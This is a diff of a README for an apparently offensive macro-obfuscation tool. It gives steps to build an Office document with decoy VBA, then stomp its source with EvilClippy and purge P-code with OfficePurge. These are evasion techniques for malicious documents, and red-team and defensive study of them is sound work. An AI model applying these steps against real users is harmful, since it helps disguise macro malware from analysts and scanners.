@@ -21,5 +21,5 @@ options:
 1. Generate the two VBA files: `python3 obfus_vba.py -f calc.exe -t exe`
 2. Create an office document, click View -> Macros -> Create
 3. Paste de fake.vba code into the ThisDocument macro and save the document
-4. You can use EvilClippy to stomp the vba code like this: `EvilClippy.exe -s final.vba Doc1.doc`
-5. You can use OfficePurge to purge P-code from module streams: `OfficePurge.exe -d word -f Doc1_EvilClippy.doc -m ThisDocument`
+4. You can use EvilClippy to stomp the vba code like this: `EvilClippy.exe -g -s fake.vba -r Doc1.doc`
+5. You can use OfficePurge to purge P-code from module streams: `OfficePurge.exe -d word -f Doc1.doc -m ThisDocument`
